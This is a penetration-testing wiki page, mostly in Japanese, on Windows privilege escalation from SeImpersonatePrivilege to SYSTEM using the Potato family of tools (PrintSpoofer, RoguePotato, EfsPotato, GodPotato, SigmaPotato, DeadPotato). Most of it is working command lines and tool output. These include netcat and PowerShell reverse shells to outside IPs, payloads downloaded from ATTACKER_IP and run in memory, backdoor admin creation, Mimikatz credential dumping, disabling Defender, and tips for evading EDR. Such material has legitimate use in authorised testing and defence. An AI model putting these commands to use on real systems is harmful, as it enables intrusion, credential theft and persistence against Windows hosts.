# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** を使用して、**同等の特権を利用して `NT AUTHORITY\SYSTEM`** レベルのアクセスを取得することができます。こちらの [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) は `PrintSpoofer` ツールについて詳述しており、JuicyPotato が動作しない Windows 10 および Server 2019 ホストで impersonation 権限を悪用する方法を解説しています。

> [!TIP]
> 2024–2025 年に頻繁にメンテナンスされている現代的な代替は SigmaPotato（GodPotato の fork）で、in-memory/.NET reflection の使用や拡張された OS サポートを追加しています。下の簡単な使用例と参考リポジトリを参照してください。

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 要件とよくある落とし穴

以下のすべての手法は、次のいずれかの権限を持つコンテキストから、impersonation 対応の特権サービスを悪用することに依存します：

- SeImpersonatePrivilege（最も一般的）または SeAssignPrimaryTokenPrivilege
- トークンにすでに SeImpersonatePrivilege がある場合は、高い整合性（High integrity）は必須ではありません（IIS AppPool、MSSQL など多くのサービスアカウントで典型的）。

権限を素早く確認：
```cmd
whoami /priv | findstr /i impersonate
```
運用ノート:

- シェルが SeImpersonatePrivilege を持たない制限トークンで実行されている場合（特に Local Service/Network Service のコンテキストでよくある）、FullPowers を使ってアカウントのデフォルト特権を回復してから Potato を実行してください。例: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer は Print Spooler サービスが実行中で、ローカル RPC エンドポイント (spoolss) で到達可能である必要があります。PrintNightmare 後に Spooler が無効化されているようなハードニングされた環境では、RoguePotato/GodPotato/DCOMPotato/EfsPotato を優先してください。
- RoguePotato は TCP/135 で到達可能な OXID resolver を必要とします。egress がブロックされている場合は、リダイレクタ/ポートフォワーダーを使用してください（下の例を参照）。古いビルドでは -f フラグが必要でした。
- EfsPotato/SharpEfsPotato は MS-EFSR を悪用します。あるパイプがブロックされている場合は、代替のパイプ (lsarpc, efsrpc, samr, lsass, netlogon) を試してください。
- RpcBindingSetAuthInfo 実行時のエラー 0x6d3 は、通常、不明またはサポートされていない RPC 認証サービスを示します。別のパイプ/トランスポートを試すか、ターゲットサービスが実行中であることを確認してください。
- DeadPotato のような「kitchen-sink」フォークは、ディスクに触れる追加のペイロードモジュール（Mimikatz/SharpHound/Defender off）をバンドルします。スリムなオリジナルと比べて EDR に検知されやすくなることを想定してください。

## クイックデモ

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
メモ:
- 現在のコンソールでインタラクティブなプロセスを生成するには -i を、ワンライナーを実行するには -c を使用できます。
- Spooler service が必要です。無効になっていると失敗します。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
アウトバウンドのポート135がブロックされている場合は、redirector上でsocatを使ってOXID resolverをpivotしてください:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotatoは、2022年末に公開された新しいCOM悪用プリミティブで、Spooler/BITSではなく**PrintNotify**サービスを標的とします。バイナリはPrintNotify COMサーバをインスタンス化し、偽の`IUnknown`を差し込み、`CreatePointerMoniker`を通じて特権コールバックをトリガーします。PrintNotifyサービス（**SYSTEM**として実行）が接続してくると、プロセスは返されたトークンを複製して、完全な権限で指定されたペイロードを起動します。

Key operational notes:

* Print Workflow/PrintNotifyサービスがインストールされていれば、Windows 10/11 および Windows Server 2012–2022で動作します（旧来のSpoolerがPrintNightmare後に無効化されている場合でも存在します）。
* 呼び出しコンテキストが**SeImpersonatePrivilege**を保持している必要があります（IIS APPPOOL、MSSQL、スケジュールされたタスクのサービスアカウントで典型的）。
* 直接コマンドまたはインタラクティブモードのいずれかを受け付け、元のコンソール内にとどまることができます。例：

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 純粋にCOMベースであるため、named-pipeリスナーや外部リダイレクタは不要で、DefenderがRoguePotatoのRPCバインディングをブロックするホスト上での置き換えとしてそのまま利用できます。

Ink Dragonのようなオペレーターは、SharePointでViewState RCEを獲得した直後にPrintNotifyPotatoを実行して、`w3wp.exe`ワーカーから**SYSTEM**へピボットし、ShadowPadをインストールする前に権限を昇格させます。

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
ヒント: ある pipe が失敗するか EDR によってブロックされた場合は、他のサポートされている pipe を試してください:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
- SeImpersonatePrivilege が存在する場合、Windows 8/8.1–11 および Server 2012–2022 で動作します。
- インストールされているランタイムに合ったバイナリを取得してください（例: `GodPotato-NET4.exe` on modern Server 2022）。
- 初期の execution primitive が短いタイムアウトの webshell/UI の場合、payload を script としてステージし、長い inline command を直接実行する代わりに GodPotato に実行させてください。

書き込み可能な IIS webroot からの Quick staging pattern:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato は、デフォルトで RPC_C_IMP_LEVEL_IMPERSONATE を使用するサービス DCOM オブジェクトを対象とした2つのバリアントを提供します。提供された binaries をビルドするか使用して、コマンドを実行してください:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (更新された GodPotato フォーク)

SigmaPotato は .NET reflection を介したインメモリ実行や PowerShell reverse shell helper といったモダンな便利機能を追加します。
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Built-in reverse shell flag `--revshell` and removal of the 1024-char PowerShell limit so you can fire long AMSI-bypassing payloads in one go.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), plus a rudimentary AV evasion trick via `VirtualAllocExNuma()` to throw off simple heuristics.
- Separate `SigmaPotatoCore.exe` compiled against .NET 2.0 for PowerShell Core environments.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato keeps the GodPotato OXID/DCOM impersonation chain but bakes in post-exploitation helpers so operators can immediately take SYSTEM and perform persistence/collection without additional tooling.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — 任意のコマンドを SYSTEM として実行します。
- `-rev <ip:port>` — 簡易 reverse shell。
- `-newadmin user:pass` — persistence のためのローカル管理者を作成します。
- `-mimi sam|lsa|all` — Mimikatz を展開して実行し、資格情報をダンプします（ディスクに書き込み、ノイズが大きい）。
- `-sharphound` — SYSTEM として SharpHound collection を実行します。
- `-defender off` — Defender のリアルタイム保護を無効化します（非常にノイズが大きい）。

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
追加のバイナリが同梱されているため、AV/EDRによる検出が増えることが予想されます。ステルスが重要な場合は、よりスリムな GodPotato/SigmaPotato を使用してください。

## 参考

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
